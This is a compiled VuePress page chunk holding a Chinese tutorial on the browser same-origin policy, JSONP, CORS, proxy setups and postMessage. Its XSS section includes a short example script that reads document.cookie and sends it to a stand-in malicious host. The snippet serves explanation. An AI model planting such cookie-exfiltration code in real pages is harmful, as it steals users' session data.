(window.webpackJsonp=window.webpackJsonp||[]).push([[29],{441:function(t,s,a){"use strict";a.r(s);var n=a(2),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"前言"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[t._v("#")]),t._v(" 前言")]),t._v(" "),s("p",[t._v("假如页面没有安全策略：")]),t._v(" "),s("ul",[s("li",[t._v("Web是开放的，任何资源可以介入，自己网站可以加载并执行他人网站的脚本文件、图片、音视频等资源，甚至下载其他站点的可执行文件。")]),t._v(" "),s("li",[t._v("页面上行为没有任何限制造成无序混沌的局面、不可控。")])]),t._v(" "),s("p",[t._v("打开一个银行站点，又打开一个恶意站点，恶意站点将可以做很多事情：")]),t._v(" "),s("ul",[s("li",[t._v("修改银行站点的DOM、CSSOM等信息；")]),t._v(" "),s("li",[t._v("在银行站点内部插入JavaScript脚本；")]),t._v(" "),s("li",[t._v("劫持用户登录的用户名和密码；")]),t._v(" "),s("li",[t._v("读取银行站点的Cookie、IndexDB等数据；")]),t._v(" "),s("li",[t._v("将信息上传至自己的服务器，伪造转账请求；")])]),t._v(" "),s("p",[s("strong",[t._v("没有安全策略的Web，我们是没有隐私的，所以需要安全策略来保障隐私和数据的安全。")]),s("br")]),t._v(" "),s("div",{staticClass:"custom-block tip"},[s("p",{staticClass:"title"}),s("p",[t._v("页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。")])]),s("h2",{attrs:{id:"同源策略"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#同源策略"}},[t._v("#")]),t._v(" 同源策略")]),t._v(" "),s("p",[t._v("两个URL => 协议（http）、域名（mobs.fun）、端口（80）相同 => URL同源。"),s("br"),t._v("\n浏览器默认同源之间可以"),s("strong",[t._v("相互访问资源和操作DOM")]),t._v("，不同源之间若想要相互访问资源或者操作DOM，会有"),s("strong",[t._v("一套基础的安全策略的制约")]),t._v("（同源策略）。"),s("br"),t._v("\n同源策略三个层面：")]),t._v(" "),s("ol",[s("li",[t._v("DOM层面 => 同源策略限制了不同源的JavaScript脚本对当前站点DOM对象读和写的操作。")]),t._v(" "),s("li",[t._v("数据层面 => 同源策略限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。无法通过第二个页面的"),s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener",target:"_blank",rel:"noopener noreferrer"}},[t._v("opener"),s("OutboundLink")],1),t._v("来访问第一个页面中的Cookie、IndexDB、LocalStorage等数据。")]),t._v(" "),s("li",[t._v("网络层面 => 同源策略限制了通过"),s("RouterLink",{attrs:{to:"/frontend/javascript/XMLHttpRequest.html"}},[t._v("XMLHttpRequest")]),t._v("等方式将站点的数据发送给不同源的站点。")],1)]),t._v(" "),s("h2",{attrs:{id:"安全性和便利性的权衡"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#安全性和便利性的权衡"}},[t._v("#")]),t._v(" 安全性和便利性的权衡")]),t._v(" "),s("p",[t._v("同源策略隔离了不同源的DOM、数据、网络通信，实现Web页面的安全性。"),s("br"),t._v("\n但是安全性和便利性是相互对立的，不同的源之间绝对隔离，可以说是最安全的措施，但这会让Web项目变得难以开发和使用。所以需要做出权衡，"),s("strong",[t._v("出让一些安全性来满足灵活性。")]),s("br"),t._v("\n浏览器出让的同源策略的安全性有哪些：")]),t._v(" "),s("ol",[s("li",[t._v("页面中可以嵌入第三方资源")]),t._v(" "),s("li",[t._v("跨域资源共享")]),t._v(" "),s("li",[t._v("跨文档消息机制")])]),t._v(" "),s("h3",{attrs:{id:"页面中可以嵌入第三方资源"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#页面中可以嵌入第三方资源"}},[t._v("#")]),t._v(" 页面中可以嵌入第三方资源")]),t._v(" "),s("p",[t._v("同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有HTML文件、JavaScript文件、CSS文件、图片等资源都部署在同一台服务器上。这其实违背了Web的初衷，也带来了很多限制。比如我们需要引用不同CDN上的资源，域名其实是不同的，我们是需要同源策略支持页面任意引用外部文件，所以最初的浏览器都是支持引用外部资源文件的。"),s("br"),t._v(" "),s("strong",[t._v("JSONP跨域：")])]),t._v(" "),s("ul",[s("li",[t._v("只支持GET请求（script标签src限制get请求），利用了浏览器支持加载外部JavaScript资源文件时不受同源策略的限制。")]),t._v(" "),s("li",[t._v("需要服务端和前端配合。")])]),t._v(" "),s("div",{staticClass:"language-js line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" newscript "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'script'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nnewscript"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'https://mobs.fun?callback=fn'")]),t._v("\ndocument"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("body"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("appendChild")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("newscript"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 定义fn函数")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("fn")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("data")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  console"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 服务端")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 监听请求参数callback，返回response资源 => fn({'服务端数据'})")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 返回的fn({'服务端数据'})作为JS脚本直接执行")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br")])]),s("p",[s("strong",[t._v("带来的弊端：")])]),t._v(" "),s("ul",[s("li",[t._v("HTML文件注入恶意JavaScript脚本")]),t._v(" "),s("li",[t._v("XSS攻击")])]),t._v(" "),s("div",{staticClass:"language-js line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("onClick")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 恶意脚本读取Cookie数据，并将其作为参数添加至恶意站点尾部。")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 当打开该恶意页面时，恶意服务器就能接收到当前用户的Cookie信息。")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("let")]),t._v(" url "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token template-string"}},[s("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("http://test.com?cookie=")]),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("document"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),s("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")])]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("onClick")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("p",[t._v("解决XSS攻击，浏览器中引入了"),s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP",target:"_blank",rel:"noopener noreferrer"}},[t._v("内容安全策略"),s("OutboundLink")],1),t._v("（CSP），CSP的核心思想是"),s("strong",[t._v("让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联JavaScript代码")]),t._v("。")]),t._v(" "),s("h3",{attrs:{id:"跨域资源共享-cors"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#跨域资源共享-cors"}},[t._v("#")]),t._v(" 跨域资源共享（CORS）")]),t._v(" "),s("p",[t._v("一般情况，通过XMLHttpRequest or Fetch来请求其他站点的资源，同源策略会阻止向其发出请求。为了解决这个问题，引入了"),s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS",target:"_blank",rel:"noopener noreferrer"}},[t._v("跨域资源共享"),s("OutboundLink")],1),t._v("（Cross-Origin Resource Sharing），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。"),s("br")]),t._v(" "),s("ul",[s("li",[t._v("传输HTTP头构成CORS。")]),t._v(" "),s("li",[t._v("HTTP头决定浏览器是否能够跨域请求数据。")]),t._v(" "),s("li",[t._v("服务端增加HTTP头即可构成CORS。")])]),t._v(" "),s("p",[t._v("实现：CORS将请求分为简单请求（Simple Requests）和预检请求（Preflighted requests）")]),t._v(" "),s("ol",[s("li",[s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS",target:"_blank",rel:"noopener noreferrer"}},[t._v("简单请求"),s("OutboundLink")],1),t._v(" => GET、HEAD、POST"),s("br"),t._v(" "),s("ul",[s("li",[t._v("Accept")]),t._v(" "),s("li",[t._v("Accept-Language")]),t._v(" "),s("li",[t._v("Content-Language")]),t._v(" "),s("li",[t._v("Content-Type => application/x-www-form-urlencoded、multipart/form-data、text/plain")])])]),t._v(" "),s("li",[s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Glossary/Preflight_request",target:"_blank",rel:"noopener noreferrer"}},[t._v("预检请求"),s("OutboundLink")],1),t._v(" => "),s("strong",[t._v("可能对服务器数据产生副作用的HTTP请求方法")]),t._v("，浏览器会先自动向服务端发送一个OPTIONS请求，根据服务端返回的Access-Control-Allow-*判定是否允许发起实际的HTTP请求，在预检请求的返回中，服务器端也可通知客户端是否需要携带身份凭证（Cookies、HTTP认证相关数据）"),s("br"),t._v(" "),s("ul",[s("li",[t._v("Access-Control-Allow-Origin")]),t._v(" "),s("li",[t._v("Access-Control-Allow-Methods")]),t._v(" "),s("li",[t._v("Access-Control-Allow-Headers")]),t._v(" "),s("li",[t._v("Access-Control-Allow-Credentials")])])])]),t._v(" "),s("p",[t._v("当请求的响应头符合上述条件，浏览器才发送并响应请求。")]),t._v(" "),s("div",{staticClass:"custom-block tip"},[s("p",{staticClass:"title"}),s("p",[t._v("Access-Control-Allow-Origin设置为*其实意义不大形同虚设，实际上线一般会将Access-Control-Allow-Origin值设为目标主机地址Host。")])]),s("h3",{attrs:{id:"proxy代理"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#proxy代理"}},[t._v("#")]),t._v(" Proxy代理")]),t._v(" "),s("p",[t._v("代理（Proxy）也称网络代理："),s("strong",[t._v("允许一个客户端通过这个网络代理服务与另一个网络终端进行非直接的连接")]),t._v("。一些网关、路由器等网络设备支持网络代理。一般认为代理服务有利于保障网络终端的隐私安全，防止攻击。")]),t._v(" "),s("div",{staticClass:"custom-block tip"},[s("p",{staticClass:"title"}),s("p",[t._v("核心 => 借助同源的服务器去发送请求（请求代理转发），将跨域请求转换成同源请求。")])]),s("p",[t._v("页面请求所在同域的服务器 => 服务器向目标服务器请求数据 => 返回给前端页面。")]),t._v(" "),s("ol",[s("li",[t._v("配置Nginx实现代理")])]),t._v(" "),s("div",{staticClass:"language-json line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-json"}},[s("code",[t._v("server "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    listen  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(";\n    location /api "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n      # 转发代理的目标服务器  \n      proxy_pass  http"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//127.0.0.1:3000;")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("ol",{attrs:{start:"2"}},[s("li",[t._v("本地开发代理\n借助webpack开启一个本地服务器作为代理服务器，借助代理服务器去请求目标服务器，结果转发回前端。"),s("br"),t._v("\nPS："),s("strong",[t._v("最终发布上线时如果web应用和接口服务器不在一起仍会跨域")]),t._v("。")])]),t._v(" "),s("div",{staticClass:"language-js line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[t._v("module"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exports "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("devServer")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("host")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'127.0.0.1'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("port")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("proxy")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 告诉node，url前面是/api就使用代理")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token string-property property"}},[t._v("'/api'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" \n                "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 目标服务器")]),t._v("\n                "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("target")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://xxx.xxx.xx.xx"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" \n                "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 是否跨域")]),t._v("\n                "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("changeOrigin")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("true")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n                "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// 把实际Request Url中的/api用" "代替')]),t._v("\n                "),s("span",{pre:!0,attrs:{class:"token literal-property property"}},[t._v("pathRewrite")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" \n                    "),s("span",{pre:!0,attrs:{class:"token string-property property"}},[t._v("'^/api'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('" "')]),t._v(" \n                "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 配置axios发送请求的根路径")]),t._v("\naxios"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("defaults"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("baseURL "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'/api'")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br")])]),s("h3",{attrs:{id:"跨文档消息机制"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#跨文档消息机制"}},[t._v("#")]),t._v(" 跨文档消息机制")]),t._v(" "),s("p",[t._v("同源策略下，如果两个页面不同源的，则无法相互操纵DOM。实际情况下，经常需要两个不同源的DOM之间进行通信，所以浏览器中又引入了跨文档消息机制，可以通过JavaScript接口"),s("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage",target:"_blank",rel:"noopener noreferrer"}},[t._v("window.postMessage"),s("OutboundLink")],1),t._v("来进行不同源的DOM通信。")]),t._v(" "),s("h2",{attrs:{id:"总结"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[t._v("#")]),t._v(" 总结")]),t._v(" "),s("ul",[s("li",[t._v("同源策略隔离不同源的DOM、数据、网络通信，实现Web页面的安全性。"),s("br")])]),t._v(" "),s("p",[t._v("目前在安全性和便利性权衡下的安全策略特点：")]),t._v(" "),s("ol",[s("li",[t._v("页面可以引用第三方资源 => 暴露了很多安全问题（XSS攻击）=> 在此基础上引入了CSP来限制其自由程度。")]),t._v(" "),s("li",[t._v("使用XMLHttpRequest和Fetch是无法直接进行跨域请求的 => 浏览器在其基础上引入了"),s("strong",[t._v("跨域资源共享策略")]),t._v("，让其安全地进行跨域操作。")]),t._v(" "),s("li",[t._v("两个不同源的DOM不能相互操纵 => 浏览器中实现了"),s("strong",[t._v("跨文档消息机制")]),t._v("让其安全地通信。")]),t._v(" "),s("li",[t._v("JSONP、请求代理等方案实现跨域。")])])])}),[],!1,null,null,null);s.default=r.exports}}]);